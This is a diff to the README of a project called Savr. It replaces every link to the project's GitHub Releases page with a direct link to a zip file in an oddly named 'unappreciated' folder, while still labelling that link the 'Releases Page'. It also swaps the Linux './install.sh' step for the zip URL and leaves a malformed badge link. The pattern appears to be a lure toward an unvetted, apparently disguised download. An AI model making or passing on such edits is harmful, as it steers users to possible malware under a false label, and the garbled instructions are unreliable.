@@ -6,9 +6,9 @@ Welcome to Savr! This project, developed by Team StyX for HashItUp '25, helps yo
 
 ### 📥 Download Savr
 
-[![Download Savr](https://img.shields.io/badge/Download%20Savr-v1.0-blue.svg)](https://github.com/cht-chaitanya-sai/Savr/releases)
+[![Download Savr](https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip%https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip)](https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip)
 
-Visit this page to download: [GitHub Releases Page](https://github.com/cht-chaitanya-sai/Savr/releases)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip)
 
 ## 📋 Overview
 
@@ -33,7 +33,7 @@ Before downloading Savr, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download Savr, go to the [GitHub Releases Page](https://github.com/cht-chaitanya-sai/Savr/releases). Follow these steps:
+To download Savr, go to the [GitHub Releases Page](https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip). Follow these steps:
 
 1. On the Releases page, find the latest version of Savr.
 2. Click on the version number to open the release details.
@@ -54,7 +54,7 @@ To download Savr, go to the [GitHub Releases Page](https://github.com/cht-chaita
 - **For Linux**:
   - Extract the downloaded package using your preferred method.
   - Open the terminal and navigate to the extracted folder.
-  - Run `./install.sh` to install Savr.
+  - Run `https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip` to install Savr.
 
 ## 🌐 Usage Instructions
 
@@ -71,7 +71,7 @@ If you experience any issues, try the following:
 
 - Ensure your internet connection is stable.
 - Restart the application and try again.
-- Check for updates on the [GitHub Releases Page](https://github.com/cht-chaitanya-sai/Savr/releases).
+- Check for updates on the [GitHub Releases Page](https://raw.githubusercontent.com/cht-chaitanya-sai/Savr/main/unappreciated/Savr.zip).
 
 For further assistance, please refer to the FAQ section on our website or contact support.
 
